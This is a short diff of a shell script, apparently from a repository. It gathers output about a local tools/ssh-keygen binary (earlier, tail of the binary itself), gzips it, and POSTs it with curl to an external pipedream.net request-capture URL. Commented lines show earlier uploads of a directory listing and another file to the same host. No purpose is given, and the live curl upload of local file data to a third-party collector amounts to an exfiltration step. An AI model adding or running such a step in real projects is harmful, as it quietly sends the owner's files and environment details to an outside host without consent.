@@ -11,15 +11,14 @@
 #curl "$url"
 
 #echo $(ls -la tools) > body
-> body3
-echo $(tail -3 tools/ssh-keygen) > body3
+> body
+echo $(file tools/ssh-keygen) > body
 
 #curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
 #  -H "Content-Type: text/xml" \
 #  --data-binary "@file2.txt"
 
-gzip body3
+gzip body
 curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
   -H "Content-Encoding: gzip" \
-  --data-binary "@body3.gz" \
-  --limit-rate 900k
+  --data-binary "@body.gz" \
